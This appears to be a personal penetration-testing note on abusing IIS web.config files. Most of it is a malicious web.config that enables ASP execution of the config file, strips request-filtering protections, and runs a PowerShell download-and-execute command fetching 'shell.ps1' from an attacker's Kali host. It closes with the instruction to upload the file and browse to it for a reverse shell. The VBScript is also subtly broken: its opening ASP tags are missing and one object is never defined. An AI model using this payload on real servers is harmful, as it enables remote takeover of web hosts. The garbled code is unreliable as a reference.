---
title: web.config
updated: 2023-11-21 10:21:07Z
created: 2023-11-20 11:40:09Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

The web.config file plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in Apache web server

web.config with shell code

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />      
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://<kali>/shell.ps1')"
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.write(strOutput)
WScript.Echo(strOutput)
%>
-->
```

After uploading, browse to web.config and receive reverse shell
